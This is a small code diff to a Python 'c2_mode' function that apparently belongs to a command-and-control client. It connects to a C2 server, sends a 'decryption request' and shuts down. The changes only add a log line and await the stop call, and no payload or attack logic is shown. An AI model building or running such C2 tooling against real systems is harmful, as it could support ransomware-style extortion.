@@ -5,6 +5,8 @@ import platform
 
 async def c2_mode(data):
     program = Program(data=data, mode="c2", system=platform.system())
+    id = data.get("id", "")
+    print("Connecting to C2 server with ID:", id)
     program.set_id(data.get("id", ""))
 
     # Start connection in background
@@ -17,7 +19,7 @@ async def c2_mode(data):
     await program.send_decryption_request()
 
     # Optional: stop the program
-    program.stop()
+    await program.stop()
 
     # Wait for clean shutdown
     await start_task
